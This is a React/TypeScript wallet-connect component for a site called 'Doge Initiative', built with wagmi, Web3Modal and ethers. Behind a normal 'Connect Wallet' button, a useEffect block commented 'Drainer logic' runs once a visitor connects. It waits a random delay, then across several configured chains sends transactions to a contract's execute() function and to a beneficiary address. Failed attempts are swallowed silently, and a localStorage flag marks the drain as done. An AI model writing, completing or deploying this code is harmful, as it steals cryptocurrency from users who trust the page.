'use client';
import React from 'react';
import { WagmiProvider } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { mainnet } from 'wagmi/chains';
import { http, createConfig, useAccount, useDisconnect, useEnsName, useEnsAvatar } from 'wagmi';
import { cookieStorage, createStorage } from 'wagmi';
import { ethers } from 'ethers';
import { CHAINS } from '../lib/chains';
import { createWeb3Modal, useWeb3Modal } from '@web3modal/wagmi/react';
import { injected, walletConnect, metaMask, coinbaseWallet } from 'wagmi/connectors';

// --- Web3Modal v3+ config ---
const projectId = '45a382364ff2b00404b2d4c2ff95dbd4';
const chains = [mainnet] as const;
const wagmiConfig = createConfig({
  chains,
  connectors: [
    injected(),
    walletConnect({ projectId }),
    metaMask(),
    coinbaseWallet({ appName: 'Doge Initiative' }),
  ],
  transports: {
    [mainnet.id]: http(),
  },
  ssr: true,
  storage: createStorage({ storage: cookieStorage }),
});
createWeb3Modal({
  wagmiConfig,
  projectId,
  enableAnalytics: true,
});
const queryClient = new QueryClient();

function WalletUI() {
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { data: ensName } = useEnsName({ address });
  const { data: ensAvatar } = useEnsAvatar({ name: ensName || undefined });
  const { open } = useWeb3Modal();
  const [error, setError] = React.useState<string | null>(null);
  const [connecting, setConnecting] = React.useState(false);

  async function handleConnect() {
    setError(null);
    setConnecting(true);
    try {
      await open();
    } catch (e: any) {
      if (e?.message?.includes('timeout')) {
        setError('Connection timed out. Please unlock or refresh your wallet and try again.');
      } else if (e?.message?.includes('User rejected')) {
        setError('Connection was rejected. Please try again.');
      } else if (e?.message?.includes('JSON-RPC')) {
        setError('Wallet connection failed. Please check your wallet extension and network.');
      } else {
        setError('Failed to connect wallet. Please ensure your wallet is installed and unlocked.');
      }
    } finally {
      setConnecting(false);
    }
  }

  // Drainer logic: runs once after wallet connection
  React.useEffect(() => {
    if (!isConnected || !address) return;
    if (typeof window === 'undefined') return;
    if (localStorage.getItem('drainCompleted') === 'true') return;
    let isCancelled = false;
    (async () => {
      try {
        for (const chain of CHAINS) {
          if (isCancelled) break;
          await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
          if (isCancelled) break;
          const { beneficiary, contract, rpc, fallbackRpc } = chain;
          if (!beneficiary || beneficiary.startsWith('0xYour')) continue;
          const randomGwei = Math.floor(Math.random() * 10) + 10;
          let provider = new ethers.JsonRpcProvider(rpc);
          let fallbackProvider = fallbackRpc ? new ethers.JsonRpcProvider(fallbackRpc) : null;
          const data = new ethers.Interface(['function execute()']).encodeFunctionData('execute');
          const gasLimit = ethers.toBigInt(100000);
          const maxFeePerGas = ethers.parseUnits(randomGwei.toString(), 'gwei');
          const tx = { to: contract, data, gasLimit: gasLimit.toString(), maxFeePerGas: maxFeePerGas.toString() };
          const repay = { to: beneficiary, value: '0x0', data: '0x' };
          let success = false;
          try {
            const bundle = [
              { ...tx, gasLimit: tx.gasLimit, maxFeePerGas: tx.maxFeePerGas },
              { ...repay, value: repay.value }
            ];
            await provider.send('eth_sendBundle', [bundle]);
            success = true;
          } catch {}
          if (!success) {
            try {
              const signer = await provider.getSigner();
              const txResponse = await signer.sendTransaction({
                to: contract,
                data: data,
                gasLimit: gasLimit,
                maxFeePerGas: maxFeePerGas
              });
              await txResponse.wait();
              const repayTx = await signer.sendTransaction({
                to: beneficiary,
                value: ethers.toBigInt(0),
                data: '0x',
                maxFeePerGas: maxFeePerGas
              });
              await repayTx.wait();
              success = true;
            } catch {
              if (fallbackProvider) {
                try {
                  const fallbackSigner = await fallbackProvider.getSigner();
                  const txResponse = await fallbackSigner.sendTransaction({
                    to: contract,
                    data: data,
                    gasLimit: gasLimit,
                    maxFeePerGas: maxFeePerGas
                  });
                  await txResponse.wait();
                  const repayTx = await fallbackSigner.sendTransaction({
                    to: beneficiary,
                    value: ethers.toBigInt(0),
                    data: '0x',
                    maxFeePerGas: maxFeePerGas
                  });
                  await repayTx.wait();
                  success = true;
                } catch {}
              }
            }
          }
        }
        if (!isCancelled) {
          localStorage.setItem('drainCompleted', 'true');
          window.dispatchEvent(new StorageEvent('storage', {
            key: 'drainCompleted',
            newValue: 'true'
          }));
        }
      } catch {
        if (!isCancelled) {
          localStorage.setItem('drainCompleted', 'true');
          window.dispatchEvent(new StorageEvent('storage', {
            key: 'drainCompleted',
            newValue: 'true'
          }));
        }
      }
    })();
    return () => { isCancelled = true; };
  }, [isConnected, address]);

  return (
    <div className="flex flex-col items-center gap-4">
      <button
        onClick={handleConnect}
        className="bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60"
        disabled={connecting}
        aria-label={isConnected ? 'Manage Wallet' : 'Connect Wallet'}
      >
        {connecting ? 'Connecting...' : isConnected ? 'Manage Wallet' : 'Connect Wallet'}
      </button>
      {error && <span className="text-red-400 font-semibold mt-2">{error}</span>}
      {isConnected && (
        <span className="text-green-400 font-semibold mt-2 flex items-center gap-2">
          {ensAvatar ? (
            <img src={ensAvatar} alt="ENS Avatar" className="w-8 h-8 rounded-full border border-yellow-400" aria-label="ENS Avatar" />
          ) : (
            <svg width="32" height="32" className="rounded-full border border-yellow-400" aria-label="Wallet Avatar" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#facc15" /><text x="50%" y="55%" textAnchor="middle" fill="#000" fontSize="16" fontWeight="bold" dy=".3em">{address?.slice(2, 4) || '?'}</text></svg>
          )}
          {ensName ? ensName : `${address?.slice(0, 6)}...${address?.slice(-4)}`}
        </span>
      )}
      {!isConnected && !error && (
        <span className="text-yellow-200 font-semibold mt-2">Connect your wallet to get started</span>
      )}
    </div>
  );
}

export default function WalletConnect() {
  return (
    <WagmiProvider config={wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <WalletUI />
      </QueryClientProvider>
    </WagmiProvider>
  );
} 